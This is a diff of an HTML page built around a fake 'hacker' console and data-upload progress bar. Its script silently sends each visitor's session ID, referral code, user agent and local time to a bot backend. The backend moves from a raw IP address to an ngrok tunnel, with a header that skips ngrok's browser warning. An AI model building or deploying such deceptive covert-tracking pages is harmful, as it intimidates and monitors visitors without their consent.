@@ -21,7 +21,7 @@
                 <div id="terminalConsole" class="terminal-console"></div>
                 <div class="hacker-progress-container">
                     <div class="progress-info">
-                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
+                        <span id="progressText">ENCODER ACTIVED...</span>
                         <span id="progressPercent">0%</span>
                     </div>
                     <div class="progress-bar-bg">
@@ -89,19 +89,24 @@
 
     <div id="toastContainer" class="toast-container"></div>
     
-    <!-- === ДОБАВЛЕННЫЙ БЛОК: Скрипт связи с ботом (Визиты и Переадресация) === -->
     <script>
-        // 1. Создаем или получаем уникальный ID сессии для отслеживания пользователя
         const currentSessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 10);
         localStorage.setItem('sessionId', currentSessionId);
 
-        // 2. Отправляем уведомление о визите сразу при загрузке страницы
+        const urlParams = new URLSearchParams(window.location.search);
+        const refCode = urlParams.get('ref');
+
+        // Отправка визита (Этап 1) с правильными заголовками
         window.addEventListener('DOMContentLoaded', () => {
-            fetch('http://144.124.237.170:5001/api/visit', {
+            fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/visit', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'ngrok-skip-browser-warning': 'true' // <--- ЭТО РЕШАЕТ ВСЁ
+                },
                 body: JSON.stringify({
                     sessionId: currentSessionId,
+                    refCode: refCode,
                     deviceInfo: {
                         userAgent: navigator.userAgent,
                         localTime: new Date().toLocaleTimeString()
@@ -109,25 +114,8 @@
                 })
             }).catch(err => console.error("Ошибка отправки визита:", err));
         });
-
-        // 3. Функция, которую вы можете вызывать для переадресации на error.html
-        // Она сначала отправит лог в бота, а затем перекинет пользователя
-        function redirectWithErrorLog(targetUrl = 'error.html') {
-            fetch('http://144.124.237.170:5001/api/redirect_log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: currentSessionId,
-                    target: targetUrl
-                })
-            }).finally(() => {
-                // Переадресация срабатывает в любом случае
-                window.location.href = targetUrl;
-            });
-        }
     </script>
-    <!-- === КОНЕЦ ДОБАВЛЕННОГО БЛОКА === -->
 
-    <script src="script.js"></script>
+    <script src="script.js?v=2"></script></body>
 </body>
 </html>
